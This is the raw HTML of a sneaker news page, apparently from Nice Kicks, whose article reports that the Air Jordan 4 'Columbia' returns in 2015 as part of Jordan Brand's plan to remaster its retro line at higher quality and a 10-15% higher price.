	<form method="get" id="searchform" action="http://www.nicekicks.com/" role="search">
		<label for="s" class="assistive-text">Search</label>
		
			<input type="text" class="field" name="s" value="" id="s" placeholder="Search here" />
	
		<input type="submit" class="submit" name="submit" id="searchsubmit" value="" />
	</form>
	
</div>						
					</div><!--#full-super-top -->
		
					
					<!-- Masthead
					================================================== -->
					<div id="mgm-full-top">
						<header id="masthead" class="site-header clearfix" role="banner">
							
							<div id="wvn_branding_ad">
								<div id="mgm-branding">
								
																		
									
																				
										<div class="mgm-logo">
										
											<div class="mgm-logo-wrap">
											
												<a href="http://www.nicekicks.com/" title="NiceKicks.com" rel="home"><img src="http://nk_wp_media.s3.amazonaws.com/files/2014/11/nk-logo-trans.png" alt="NiceKicks.com"/></a>
											</div>
											
										</div>
	
																				
										<span class="scrollup cat-bg"><span class="glyphicon glyphicon-chevron-up"></span></span>								
																	
																	
								</div><!--#mgm-branding-->
							
								<div id="mgm-top-ad">
									
<div id="wvn_atf_728">
	<div id='wvn_zone_atf728'>
		<script type='text/javascript'>
		googletag.cmd.push(function() { googletag.display('wvn_zone_atf728'); });
		</script>
	</div>
</div>
								</div>
								<div style="clear:both;"></div>
							</div>					
							
						</header><!-- #masthead .site-header .container -->
					</div><!-- #mgm-full-top -->
					
					<div class="clear"></div>
					
					
					
					
					<!-- Main Navigation
					================================================== -->	
					<a href="#mgm-menu" class="menu-toggle animated visible-xs"><i class="glyphicon glyphicon-align-justify"></i></a>
					
										
					<div class="nav-wrap" id="nav-original">

															
									
																				
										<div class="mgm-logo">
										
											<div class="mgm-logo-wrap">
											
												<a href="http://www.nicekicks.com/" title="NiceKicks.com" rel="home"><img src="http://nk_wp_media.s3.amazonaws.com/files/2014/11/nk-logo-trans.png" alt="NiceKicks.com"/></a>
											</div>
											
										</div>
	
																				
										<span class="scrollup cat-bg"><span class="glyphicon glyphicon-chevron-up"></span></span>
						<nav role="navigation" class="site-navigation main-navigation" id="mgm-menu">
		
							
							<div class="assistive-text skip-link"><a href="#content" title="Skip to content">Skip to content</a></div>
							
							<a href="#" class="menu-toggle toggle-close"><i class="glyphicon glyphicon-remove-sign"></i></a>
							
							<div class="menu-main-container"><ul id="menu-primary" class="menu"><li id="menu-item-412731" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children"><a  href="http://www.nicekicks.com/air-jordans/">Air Jordans</a><span class="bottom-line custom-color cat-bg"></span>
<ul class="sub-links">
	<li id="menu-item-412732" class="menu-item menu-item-type-custom menu-item-object-custom"><a  href="http://www.nicekicks.com/category/air-jordans/">Air Jordan news</a><span class="bottom-line custom-color cat-bg"></span></li>
	<li id="menu-item-412733" class="menu-item menu-item-type-custom menu-item-object-custom"><a  href="http://www.nicekicks.com/air-jordans/">History of Air Jordans</a><span class="bottom-line custom-color cat-bg"></span></li>
	<li id="menu-item-412734" class="menu-item menu-item-type-custom menu-item-object-custom"><a  href="http://www.nicekicks.com/air-jordan-release-dates/">Jordan release dates</a><span class="bottom-line custom-color cat-bg"></span></li>
</ul>
</li>
<li id="menu-item-412735" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children"><a  href="http://www.nicekicks.com/category/nike/">Nike</a><span class="bottom-line custom-color cat-bg"></span>
<ul class="sub-links">
	<li id="menu-item-412736" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children"><a  href="http://www.nicekicks.com/category/nike-basketball/">Nike Basketball</a><span class="bottom-line custom-color cat-bg"></span>
	<ul class="sub-links">
		<li id="menu-item-412737" class="menu-item menu-item-type-custom menu-item-object-custom"><a  href="http://www.nicekicks.com/tag/nike-kd-7/">Nike KD 7</a><span class="bottom-line custom-color cat-bg"></span></li>
		<li id="menu-item-412738" class="menu-item menu-item-type-custom menu-item-object-custom"><a  href="http://www.nicekicks.com/tag/nike-kobe-9/">Nike Kobe 9</a><span class="bottom-line custom-color cat-bg"></span></li>
		<li id="menu-item-412739" class="menu-item menu-item-type-custom menu-item-object-custom"><a  href="http://www.nicekicks.com/tag/nike-lebron-12/">Nike LeBron 12</a><span class="bottom-line custom-color cat-bg"></span></li>
	</ul>
</li>
	<li id="menu-item-412767" class="menu-item menu-item-type-taxonomy menu-item-object-category"><a  href="http://www.nicekicks.com/category/nike-shoes/nikeid/">NikeiD</a><span class="bottom-line custom-color cat-bg"></span></li>
	<li id="menu-item-412740" class="menu-item menu-item-type-custom menu-item-object-custom"><a  href="http://www.nicekicks.com/category/nike-running/">Nike Running</a><span class="bottom-line custom-color cat-bg"></span></li>
	<li id="menu-item-412741" class="menu-item menu-item-type-custom menu-item-object-custom"><a  href="http://www.nicekicks.com/category/nike-sb/">Nike SB</a><span class="bottom-line custom-color cat-bg"></span></li>
	<li id="menu-item-412742" class="menu-item menu-item-type-custom menu-item-object-custom"><a  href="http://www.nicekicks.com/category/nike-sportswear/">Nike Sportswear</a><span class="bottom-line custom-color cat-bg"></span></li>
	<li id="menu-item-412743" class="menu-item menu-item-type-custom menu-item-object-custom"><a  href="http://www.nicekicks.com/category/nike-training/">Nike Training</a><span class="bottom-line custom-color cat-bg"></span></li>
</ul>
</li>
<li id="menu-item-412744" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children"><a  href="http://www.nicekicks.com/category/adidas/">adidas</a><span class="bottom-line custom-color cat-bg"></span>
<ul class="sub-links">
	<li id="menu-item-412745" class="menu-item menu-item-type-custom menu-item-object-custom"><a  href="http://www.nicekicks.com/category/adidas-basketball/">adidas Basketball</a><span class="bottom-line custom-color cat-bg"></span></li>
	<li id="menu-item-412746" class="menu-item menu-item-type-custom menu-item-object-custom"><a  href="http://www.nicekicks.com/category/adidas-originals/">adidas Originals</a><span class="bottom-line custom-color cat-bg"></span></li>
</ul>
</li>
<li id="menu-item-412747" class="menu-item menu-item-type-custom menu-item-object-custom"><a  href="http://www.nicekicks.com/category/new-balance/">New Balance</a><span class="bottom-line custom-color cat-bg"></span></li>
<li id="menu-item-412748" class="menu-item menu-item-type-custom menu-item-object-custom"><a  href="http://www.nicekicks.com/category/puma">PUMA</a><span class="bottom-line custom-color cat-bg"></span></li>
<li id="menu-item-412749" class="menu-item menu-item-type-custom menu-item-object-custom"><a  href="http://www.nicekicks.com/category/reebok">Reebok</a><span class="bottom-line custom-color cat-bg"></span></li>
<li id="menu-item-412750" class="menu-item menu-item-type-custom menu-item-object-custom"><a  href="http://www.nicekicks.com/category/vans/">Vans</a><span class="bottom-line custom-color cat-bg"></span></li>
<li id="menu-item-412751" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children"><a >More Brands</a><span class="bottom-line custom-color cat-bg"></span>
<ul class="sub-links">
	<li id="menu-item-412759" class="menu-item menu-item-type-taxonomy menu-item-object-category"><a  href="http://www.nicekicks.com/category/asics/">ASICS</a><span class="bottom-line custom-color cat-bg"></span></li>
	<li id="menu-item-412760" class="menu-item menu-item-type-taxonomy menu-item-object-category"><a  href="http://www.nicekicks.com/category/converse/">Converse</a><span class="bottom-line custom-color cat-bg"></span></li>
	<li id="menu-item-412761" class="menu-item menu-item-type-taxonomy menu-item-object-category"><a  href="http://www.nicekicks.com/category/diadora/">Diadora</a><span class="bottom-line custom-color cat-bg"></span></li>
	<li id="menu-item-412762" class="menu-item menu-item-type-taxonomy menu-item-object-category"><a  href="http://www.nicekicks.com/category/etonic/">Etonic</a><span class="bottom-line custom-color cat-bg"></span></li>
	<li id="menu-item-412763" class="menu-item menu-item-type-taxonomy menu-item-object-category"><a  href="http://www.nicekicks.com/category/ewing/">Ewing Athletics</a><span class="bottom-line custom-color cat-bg"></span></li>
	<li id="menu-item-412764" class="menu-item menu-item-type-taxonomy menu-item-object-category"><a  href="http://www.nicekicks.com/category/fila/">Fila</a><span class="bottom-line custom-color cat-bg"></span></li>
	<li id="menu-item-412765" class="menu-item menu-item-type-taxonomy menu-item-object-category"><a  href="http://www.nicekicks.com/category/greats/">Greats</a><span class="bottom-line custom-color cat-bg"></span></li>
	<li id="menu-item-412766" class="menu-item menu-item-type-taxonomy menu-item-object-category"><a  href="http://www.nicekicks.com/category/huf-2/">HUF</a><span class="bottom-line custom-color cat-bg"></span></li>
	<li id="menu-item-412768" class="menu-item menu-item-type-taxonomy menu-item-object-category"><a  href="http://www.nicekicks.com/category/saucony/">Saucony</a><span class="bottom-line custom-color cat-bg"></span></li>
	<li id="menu-item-412769" class="menu-item menu-item-type-taxonomy menu-item-object-category"><a  href="http://www.nicekicks.com/category/supra/">Supra</a><span class="bottom-line custom-color cat-bg"></span></li>
	<li id="menu-item-412770" class="menu-item menu-item-type-taxonomy menu-item-object-category"><a  href="http://www.nicekicks.com/category/under-armour/">Under Armour</a><span class="bottom-line custom-color cat-bg"></span></li>
</ul>
</li>
<li id="menu-item-412752" class="menu-item menu-item-type-custom menu-item-object-custom"><a  href="http://www.nicekicks.com/sneaker-release-dates/">Release Dates</a><span class="bottom-line custom-color cat-bg"></span></li>
</ul></div>							
						</nav><!-- .site-navigation .main-navigation -->
					
					</div><!-- #nav-wrap -->
									
			</div><!--mgm-header-opacity-->
				
					
							
		</div><!--mgm-header-wrap-->
		
		<div id="mgm-middle-ad">
			
<div id="wvn_970" class="row-fluid">
	<div id="wvn_zone_970">
		<script type='text/javascript'>
			googletag.cmd.push(function() { googletag.display('wvn_zone_970'); });
		</script>
	</div>
</div>
		</div>

			
		<div id="main" class="site-main container">
			<div id="main-spinner"><div class="mgm-spinner-pos"><div class="mgm-spinner mgm-spinner-xxl"></div></div></div>			<div class="content-sidebar-wrap">
<div class="row">
	
	<div id="primary" class="content-area col-md-8">
		<div id="content" class="site-content" role="main">

				
			
			
			
<div id="fb-root"></div>
		<script>(function(d, s, id) {
		  var js, fjs = d.getElementsByTagName(s)[0];
		  if (d.getElementById(id)) return;
		  js = d.createElement(s); js.id = id;
		  js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
		  fjs.parentNode.insertBefore(js, fjs);
		}(document, "script", "facebook-jssdk"));
		</script>
<article id="post-385314" class="post-385314 post type-post status-publish format-standard hentry category-air-jordans category-jordan-brand tag-air-jordan-4 tag-air-jordan-4-columbia tag-air-jordans">

	<header class="entry-header boxed">
		
		<ul class="breadcrumb" xmlns:v="http://rdf.data-vocabulary.org/#"><li typeof="v:Breadcrumb"><a rel="v:url" property="v:title" href="http://www.nicekicks.com/"><span class="glyphicon glyphicon-home"></span> Home</a></li><li typeof="v:Breadcrumb"><a rel="v:url" property="v:title" href="http://www.nicekicks.com/category/jordan-brand/">Jordan Brand</a></li><li typeof="v:Breadcrumb"><a rel="v:url" property="v:title" href="http://www.nicekicks.com/category/jordan-brand/air-jordans/">Air Jordans</a></li><li class="current">Air Jordan 4 &#8220;Columbia&#8221;</li></ul><!-- .breadcrumbs -->		
		<h1 class="entry-title">Air Jordan 4 &#8220;Columbia&#8221;</h1>		
		
		<div class="clear"></div>
		
		<div class="entry-details clearfix">
			
			<div class="mgm-cat">
			
				<a style="background-color: " href="http://www.nicekicks.com/category/jordan-brand/air-jordans/" title="View all posts in Air Jordans">Air Jordans</a> <a style="background-color: " href="http://www.nicekicks.com/category/jordan-brand/" title="View all posts in Jordan Brand">Jordan Brand</a>
			</div>
			
			<span class="mgm-details">
			
				<span class="entry-posted-on"><span class="glyphicon glyphicon-edit"></span> <a href="http://www.nicekicks.com/2014/06/06/air-jordan-4-columbia/" title="2:33 pm" rel="bookmark"><time class="entry-date" datetime="2014-06-06T14:33:21+00:00">Jun 6, 2014</time></a><span class="byline"> <i class="icon-pencil"></i> <span class="author vcard"><a class="url fn n" href="http://www.nicekicks.com/author/brittany/" title="View all posts by Brittany Shelton" rel="author">Brittany Shelton</a></span></span></span>
				
				<span class="entry-details-item">
					<span class="glyphicon glyphicon-eye-open"></span> 5533				</span>
				
				<span class="entry-details-item">
					<a href="http://www.nicekicks.com/2014/06/06/air-jordan-4-columbia/#comments">
						<span class="glyphicon glyphicon-comment"></span>
						3					</a>
				</span>
				
			</span>

		</div><!--entry-details-->
				
	</header><!-- .entry-header -->
	
	
		<div class="entry-img featured-img">	
	
	
		<span class="entry-img-src">
				</span>
		
				
	</div><!-- entry-img -->
		
	




	<div class="entry-content clearfix">
		
		
                    <aside class="mashsb-container">
                    <div class="mashsb-box"><div class="mashsb-buttons"><a style="" class="mashicon-facebook" href="http://www.facebook.com/sharer.php?s=100&u=http://www.nicekicks.com/2014/06/06/air-jordan-4-columbia/&p[title]=Air+Jordan+4+%E2%80%9CColumbia%E2%80%9D&p[summary]=The+Air+Jordan+4+%22Columbia%22+is+officially+returning+in+2015.+In+a+new+interview+with%C2%A0Sole+Collector%2C%C2%A0Dave+Schechter%2C+VP+of+Jordan+Footwear%2C+and+Jeff+Atienza%2C+Jordan+Brand+Product+Line+Manager%2C+reveal+that+Jordan+Brand+will+be+%E2%80%A6&p[images][0]=" target="_blank"><span class="icon"></span><span class="text">Facebook</span></a><a style="" class="mashicon-twitter" href="https://twitter.com/intent/tweet?text=Air+Jordan+4+%E2%80%9CColumbia%E2%80%9D via nicekicks&url=http://www.nicekicks.com/?p=385314" target="_blank"><span class="icon"></span><span class="text">Twitter</span></a><a style="" class="mashicon-subscribe" href="#" target="_blank"><span class="icon"></span><span class="text">Subscribe</span></a><div class="onoffswitch2" style="display:none;"><input type="checkbox" name="onoffswitch2" class="onoffswitch2-checkbox" id="myonoffswitch2" checked=""><label class="onoffswitch2-label" for="myonoffswitch2"><div class="onoffswitch2-inner"></div></label></div></div></div>
                    <div style="clear:both;"></div><div class="mashsb-toggle-container" id="mashsb-toggle"><!-- Begin MailChimp Signup Form -->
<div id="mc_embed_signup"><form id="mc-embedded-subscribe-form" class="validate" action="//nicekicks.us9.list-manage.com/subscribe/post?u=e059ec494cd53260ff8a9bcfa&amp;id=8c47361c1e" method="post" name="mc-embedded-subscribe-form" novalidate="" target="_blank">
<div id="mc_embed_signup_scroll"><label for="mce-EMAIL">Join the Nice Kicks Nation newsletter</label>
<input id="mce-EMAIL" class="email" name="EMAIL" required="" type="email" value="" placeholder="email address" />
<!-- real people should not fill this in and expect good things - do not remove this or risk form bot signups-->
<div style="position: absolute; left: -5000px;"><input tabindex="-1" name="b_e059ec494cd53260ff8a9bcfa_8c47361c1e" type="text" value="" /></div>
<div class="clear"><input id="mc-embedded-subscribe" class="button" name="subscribe" type="submit" value="Subscribe" /></div>
</div>
</form></div>
<!--End mc_embed_signup--></div></aside>
                        <!-- Share buttons made by mashshare.net - Version: 2.1.5--><p><!-- BEGIN THEIA POST SLIDER --></p>
<p><img class="aligncenter size-full wp-image-385315" alt="air-jordan-iv-4-columbia-2015-retro-01" src="http://nk_wp_media.s3.amazonaws.com/files/2014/06/air-jordan-iv-4-columbia-2015-retro-01.jpg" width="980" height="735" /></p>
<p>The <strong><a rel="nofollow" target="_blank" title="Air Jordan 4" href="http://www.nicekicks.com/air-jordans/air-jordan-4/">Air Jordan 4</a> &#8220;Columbia&#8221;</strong> is officially returning in 2015. In a new interview with <a href="http://solecollector.com/news/exclusive-jordan-brand-remastering-retro-line-beginning-spring-2015/" target="_blank">Sole Collector</a>, Dave Schechter, VP of Jordan Footwear, and Jeff Atienza, Jordan Brand Product Line Manager, reveal that Jordan Brand will be remastering their retro line in 2015. Ultimately, Jordan Brand aims to bring better, higher quality product to the masses with this revamp, and while that will mean a 10%-15% increase in price depending on model, it will also mean really high standards of production and quality controls. In fact, according to Schecter, all retro models in men’s are going to be redone, meaning new materials and getting as close to the original construction of Jordans as humanly possible. One of the shoes officially set to return is the Air Jordan 4 &#8220;Columbia&#8221;, pictured in detail below. Are you looking forward to this new initiative from Jordan Brand? Are you willing to pay a bit more for higher quality retro releases? Let us know in the comments.</p>
<p><img class="aligncenter size-full wp-image-385320" alt="air-jordan-iv-4-columbia-2015-retro-02" src="http://nk_wp_media.s3.amazonaws.com/files/2014/06/air-jordan-iv-4-columbia-2015-retro-02.jpg" width="980" height="735" /></p>
<p><img class="aligncenter size-full wp-image-385317" alt="air-jordan-iv-4-columbia-2015-retro-05" src="http://nk_wp_media.s3.amazonaws.com/files/2014/06/air-jordan-iv-4-columbia-2015-retro-05.jpg" width="980" height="736" /></p>
<p><img class="aligncenter size-full wp-image-385318" alt="air-jordan-iv-4-columbia-2015-retro-04" src="http://nk_wp_media.s3.amazonaws.com/files/2014/06/air-jordan-iv-4-columbia-2015-retro-04.jpg" width="980" height="736" /></p>
<p><img class="aligncenter size-full wp-image-385319" alt="air-jordan-iv-4-columbia-2015-retro-03" src="http://nk_wp_media.s3.amazonaws.com/files/2014/06/air-jordan-iv-4-columbia-2015-retro-03.jpg" width="980" height="735" /></p>
<p><!-- END THEIA POST SLIDER --></p>		
		
	</div><!-- .entry-content -->
	

		
	
	<div class="mgm-social-share clearfix">
	
	<span class="mgm-share-text hidden-xs wow pulse" data-wow-delay="1s">Share it !</span>
	
	<ul class="clearfix">
		
			<li>
				<a href="http://twitter.com/home?status=Air+Jordan+4+%26%238220%3BColumbia%26%238221%3B+http%3A%2F%2Fwww.nicekicks.com%2F2014%2F06%2F06%2Fair-jordan-4-columbia%2F" class="mgm-share-twitter" onclick="javascript:void window.open('http://twitter.com/home?status=Air+Jordan+4+%26%238220%3BColumbia%26%238221%3B+http%3A%2F%2Fwww.nicekicks.com%2F2014%2F06%2F06%2Fair-jordan-4-columbia%2F','1412258836570','width=640,height=480,toolbar=0,menubar=0,location=0,status=1,scrollbars=1,resizable=1,left=0,top=0');return false;"><span class="socicon socicon-twitter"></span></a>
			</li>
			
						
			<li>
				<a href="http://www.facebook.com/share.php?u=http%3A%2F%2Fwww.nicekicks.com%2F2014%2F06%2F06%2Fair-jordan-4-columbia%2F&amp;title=Air+Jordan+4+%26%238220%3BColumbia%26%238221%3B" class="mgm-share-fb" onclick="javascript:void window.open('http://www.facebook.com/share.php?u=http%3A%2F%2Fwww.nicekicks.com%2F2014%2F06%2F06%2Fair-jordan-4-columbia%2F&amp;title=Air+Jordan+4+%26%238220%3BColumbia%26%238221%3B','1412258836570','width=640,height=480,toolbar=0,menubar=0,location=0,status=1,scrollbars=1,resizable=1,left=0,top=0');return false;"><span class="socicon socicon-facebook"></span></a>
			</li>
	
						
			
			<li>
				<a href="https://plus.google.com/share?url=http%3A%2F%2Fwww.nicekicks.com%2F2014%2F06%2F06%2Fair-jordan-4-columbia%2F" class="mgm-share-google" onclick="javascript:void window.open('https://plus.google.com/share?url=http%3A%2F%2Fwww.nicekicks.com%2F2014%2F06%2F06%2Fair-jordan-4-columbia%2F','1412258836570','width=640,height=480,toolbar=0,menubar=0,location=0,status=1,scrollbars=1,resizable=1,left=0,top=0');return false;"><span class="socicon socicon-google"></span></a>
			</li>
			
			
						
			<li>
				<a href="http://pinterest.com/pin/create/bookmarklet/?media=&amp;url=http%3A%2F%2Fwww.nicekicks.com%2F2014%2F06%2F06%2Fair-jordan-4-columbia%2F&amp;is_video=false&amp;description=Air+Jordan+4+%26%238220%3BColumbia%26%238221%3B" class="mgm-share-pinterest" onclick="javascript:void window.open('http://pinterest.com/pin/create/bookmarklet/?media=&amp;url=http%3A%2F%2Fwww.nicekicks.com%2F2014%2F06%2F06%2Fair-jordan-4-columbia%2F&amp;is_video=false&amp;description=Air+Jordan+4+%26%238220%3BColumbia%26%238221%3B','1412258836570','width=640,height=480,toolbar=0,menubar=0,location=0,status=1,scrollbars=1,resizable=1,left=0,top=0');return false;"><span class="socicon socicon-pinterest"></span></a>
			</li>
			
						
			
			<li>
				<a href="http://www.reddit.com/submit?url=http%3A%2F%2Fwww.nicekicks.com%2F2014%2F06%2F06%2Fair-jordan-4-columbia%2F&amp;title=Air+Jordan+4+%26%238220%3BColumbia%26%238221%3B" class="mgm-share-reddit" onclick="javascript:void window.open('http://www.reddit.com/submit?url=http%3A%2F%2Fwww.nicekicks.com%2F2014%2F06%2F06%2Fair-jordan-4-columbia%2F&amp;title=Air+Jordan+4+%26%238220%3BColumbia%26%238221%3B','1412258836570','width=640,height=480,toolbar=0,menubar=0,location=0,status=1,scrollbars=1,resizable=1,left=0,top=0');return false;"><span class="socicon socicon-reddit"></span></a>
			</li>
			
			
				</ul>
	
</div>
<div class="clear"></div>	
	<footer class="entry-meta clearfix">

		
		
		<div class="tag-list">
			<span class="mgm-share-text">Tagged</span>
			
								<a href="http://www.nicekicks.com/tag/air-jordan-4/"><span>Air Jordan 4</span></a>
								<a href="http://www.nicekicks.com/tag/air-jordan-4-columbia/"><span>Air Jordan 4 Columbia</span></a>
								<a href="http://www.nicekicks.com/tag/air-jordans/"><span>Air Jordans</span></a>
						
		</div>
		

			</footer><!-- .entry-meta -->
	
</article><!-- #post-385314 -->

<div id="author-wrap">

	<h4 class="mgm-title">
		<span class="inner">About The Author</span>
	</h4>
	
	<div class="boxed clearfix wow fadeInUp">
			
		<div class="img-frame pull-left">
			<a href="http://www.nicekicks.com/author/brittany/">
			<img alt='' src='http://1.gravatar.com/avatar/f67f50f3a9421f66963695db9df65821?s=70&amp;d=http%3A%2F%2F1.gravatar.com%2Favatar%2Fad516503a11cd5ca435acc9bb6523536%3Fs%3D70&amp;r=G' class='avatar avatar-70 photo' height='70' width='70' />			</a>
		</div>
	
		<span class="author-name"><a href="http://www.nicekicks.com/author/brittany/" title="Posts by Brittany Shelton" rel="author">Brittany Shelton</a></span>
		<p>Social Media Director, Assistant Editor. Oregon native and proud U of O and UT-Austin alum.</p>	
		
				
	
		<div id="author-socials-wrap" class="clearfix">
			<span class="author-socials clearfix">
							
								<a href="http://plus.google.com/https://plus.google.com/u/0/116688739337617022361/?rel=author" class="googleplus"></a>
								
								
							
						
								<a href="http://twitter.com/shelton_britt" class="twitter"></a>
					
			</span><!--.author socials-->
		</div><!-- #author-socials-wrap-->
		
			
	</div><!-- .boxed -->
	
</div><!-- #author-wrap -->



<article id="post" class="wvn_600x300_masonary box">
	<div class="article-content-wrapper wow fadeInUp entry-main-content">
		<div class="entry-img">
			<div class="img-frame">
				<div id="wvn_600">
					<div id='wvn_zone_600'>
						<script type='text/javascript'>
						googletag.cmd.push(function() { googletag.display('wvn_zone_600'); });
						</script>
					</div>           		
				</div>
			</div>
		</div>
	</div>
</article>

<div id="mgm-related-wrap" class="row"><h4 class="mgm-title col-md-12">
		<span>You may also like</span>
	  </h4>
<div class="mgm-related-item col-md-6 wow fadeInUp">
	<div class="boxed custom-widget">
				
		<h3 class="entry-title">
			<a href="http://www.nicekicks.com/sneaker-release-date/air-jordan-xx9-695515-001/" title="Air Jordan XX9">Air Jordan XX9</a>
			
					
		</h3>
		
		
				<div class="entry-img">
			<div class="img-frame pull-left">
					
			<a href="http://www.nicekicks.com/sneaker-release-date/air-jordan-xx9-695515-001/" title="Air Jordan XX9"><img width="60" height="60" src="http://nk_wp_media.s3.amazonaws.com/files/2015/01/jordan-release-date-60x60.jpg" class="attachment-mini-square wp-post-image" alt="Air Jordan XX9" title="Air Jordan XX9" /></a>	
			</div><!--.img-frame-->
			
		</div><!--.entry-img -->
				
		<p>
		Air Jordan XX9 Colorway: Black/White-Dark Grey-Gym Red Style #: 695515-001 Release Date: January 10, 2015 Price: $225...<a href='http://www.nicekicks.com/sneaker-release-date/air-jordan-xx9-695515-001/' title='Air Jordan XX9' class="readmore">More</a>
		</p>
		
		<span class="entry-details">
		
			<span class="entry-posted-on"><span class="glyphicon glyphicon-edit"></span> <a href="http://www.nicekicks.com/sneaker-release-date/air-jordan-xx9-695515-001/" title="10:00 am" rel="bookmark"><time class="entry-date" datetime="2015-01-10T10:00:00+00:00">Jan 10, 2015</time></a><span class="byline"> <i class="icon-pencil"></i> <span class="author vcard"><a class="url fn n" href="http://www.nicekicks.com/author/nicekicks/" title="View all posts by Matt Halfhill" rel="author">Matt Halfhill</a></span></span></span>
			<span class="pull-right">
				
				<span class="entry-details-item">
					<span class="glyphicon glyphicon-eye-open"></span> 0				</span>
				
				<span class="entry-details-item">
					<a href="http://www.nicekicks.com/sneaker-release-date/air-jordan-xx9-695515-001/#comments">
						<span class="glyphicon glyphicon-comment"></span>
						0					</a>
				</span>
				
			</span>
		</span>
	
	</div><!-- .boxed .related-posts -->
</div>


<div class="mgm-related-item col-md-6 wow fadeInUp">
	<div class="boxed custom-widget">
				
		<h3 class="entry-title">
			<a href="http://www.nicekicks.com/sneaker-release-date/air-jordan-4-retro-ls-columbia/" title="Air Jordan 4 &#8220;Columbia&#8221;">Air Jordan 4 &#8220;Columbia&#8221;</a>
			
					
		</h3>
		
		
				<div class="entry-img">
			<div class="img-frame pull-left">
					
			<a href="http://www.nicekicks.com/sneaker-release-date/air-jordan-4-retro-ls-columbia/" title="Air Jordan 4 &quot;Columbia&quot;"><img width="60" height="60" src="http://nk_wp_media.s3.amazonaws.com/files/2007/07/air-jordan-4-columbia-legend-blue-release-date1-60x60.jpg" class="attachment-mini-square wp-post-image" alt="Air Jordan 4 &#8220;Columbia&#8221;" title="Air Jordan 4 &#8220;Columbia&#8221;" /></a>	
			</div><!--.img-frame-->
			
		</div><!--.entry-img -->
				
		<p>
		Air Jordan 4 &#8220;Columbia&#8221; Colorway: White/Legend Blue-Midnight Navy Style #: 314254-107 Release Date: January 10, 2015 Price:...<a href='http://www.nicekicks.com/sneaker-release-date/air-jordan-4-retro-ls-columbia/' title='Air Jordan 4 &#8220;Columbia&#8221;' class="readmore">More</a>
		</p>
		
		<span class="entry-details">
		
			<span class="entry-posted-on"><span class="glyphicon glyphicon-edit"></span> <a href="http://www.nicekicks.com/sneaker-release-date/air-jordan-4-retro-ls-columbia/" title="10:00 am" rel="bookmark"><time class="entry-date" datetime="2015-01-10T10:00:00+00:00">Jan 10, 2015</time></a><span class="byline"> <i class="icon-pencil"></i> <span class="author vcard"><a class="url fn n" href="http://www.nicekicks.com/author/nicekicks/" title="View all posts by Matt Halfhill" rel="author">Matt Halfhill</a></span></span></span>
			<span class="pull-right">
				
				<span class="entry-details-item">
					<span class="glyphicon glyphicon-eye-open"></span> 0				</span>
				
				<span class="entry-details-item">
					<a href="http://www.nicekicks.com/sneaker-release-date/air-jordan-4-retro-ls-columbia/#comments">
						<span class="glyphicon glyphicon-comment"></span>
						0					</a>
				</span>
				
			</span>
		</span>
	
	</div><!-- .boxed .related-posts -->
</div>

<div class="clear with-space"></div>
<div class="mgm-related-item col-md-6 wow fadeInUp">
	<div class="boxed custom-widget">
				
		<h3 class="entry-title">
			<a href="http://www.nicekicks.com/2015/01/03/kyrie-irving-wears-ushers-gold-air-jordan-3s/" title="Kyrie Irving wears Usher&#8217;s All Gold Air Jordan 3s">Kyrie Irving wears Usher&#8217;s All Gold Air Jordan 3s</a>
			
					
		</h3>
		
		
				<div class="entry-img">
			<div class="img-frame pull-left">
					
			<a href="http://www.nicekicks.com/2015/01/03/kyrie-irving-wears-ushers-gold-air-jordan-3s/" title="Kyrie Irving wears Usher&#039;s All Gold Air Jordan 3s"><img width="60" height="60" src="http://nk_wp_media.s3.amazonaws.com/files/2015/01/kyrie-irving-usher-gold-air-jordan-3-lead-60x60.png" class="attachment-mini-square wp-post-image" alt="Kyrie Irving wears Usher&#8217;s All Gold Air Jordan 3s" title="Kyrie Irving wears Usher&#8217;s All Gold Air Jordan 3s" /></a>	
			</div><!--.img-frame-->
			
		</div><!--.entry-img -->
				
		<p>
		Life is good for the kid. Kyrie Irving just took to Instagram to share an...<a href='http://www.nicekicks.com/2015/01/03/kyrie-irving-wears-ushers-gold-air-jordan-3s/' title='Kyrie Irving wears Usher&#8217;s All Gold Air Jordan 3s' class="readmore">More</a>
		</p>
		
		<span class="entry-details">
		
			<span class="entry-posted-on"><span class="glyphicon glyphicon-edit"></span> <a href="http://www.nicekicks.com/2015/01/03/kyrie-irving-wears-ushers-gold-air-jordan-3s/" title="11:58 pm" rel="bookmark"><time class="entry-date" datetime="2015-01-03T23:58:21+00:00">Jan 3, 2015</time></a><span class="byline"> <i class="icon-pencil"></i> <span class="author vcard"><a class="url fn n" href="http://www.nicekicks.com/author/nicekicks/" title="View all posts by Matt Halfhill" rel="author">Matt Halfhill</a></span></span></span>
			<span class="pull-right">
				
				<span class="entry-details-item">
					<span class="glyphicon glyphicon-eye-open"></span> 190				</span>
				
				<span class="entry-details-item">
					<a href="http://www.nicekicks.com/2015/01/03/kyrie-irving-wears-ushers-gold-air-jordan-3s/#comments">
						<span class="glyphicon glyphicon-comment"></span>
						0					</a>
				</span>
				
			</span>
		</span>
	
	</div><!-- .boxed .related-posts -->
</div>


<div class="mgm-related-item col-md-6 wow fadeInUp">
	<div class="boxed custom-widget">
				
		<h3 class="entry-title">
			<a href="http://www.nicekicks.com/2015/01/03/air-jordan-4-legend-blue-official-images/" title="Air Jordan 4 &#8220;Legend Blue&#8221; Official Images">Air Jordan 4 &#8220;Legend Blue&#8221; Official Images</a>
			
					
		</h3>
		
		
				<div class="entry-img">
			<div class="img-frame pull-left">
					
			<a href="http://www.nicekicks.com/2015/01/03/air-jordan-4-legend-blue-official-images/" title="Air Jordan 4 &quot;Legend Blue&quot; Official Images"><img width="60" height="60" src="http://nk_wp_media.s3.amazonaws.com/files/2015/01/air-jordan-4-legend-blue-lead-60x60.jpg" class="attachment-mini-square wp-post-image" alt="Air Jordan 4 &#8220;Legend Blue&#8221; Official Images" title="Air Jordan 4 &#8220;Legend Blue&#8221; Official Images" /></a>	
			</div><!--.img-frame-->
			
		</div><!--.entry-img -->
				
		<p>
		The first installment in Jordan Brand’s Remastered Retro initiative, the Air Jordan 4 “Legend Blue”...<a href='http://www.nicekicks.com/2015/01/03/air-jordan-4-legend-blue-official-images/' title='Air Jordan 4 &#8220;Legend Blue&#8221; Official Images' class="readmore">More</a>
		</p>
		
		<span class="entry-details">
		
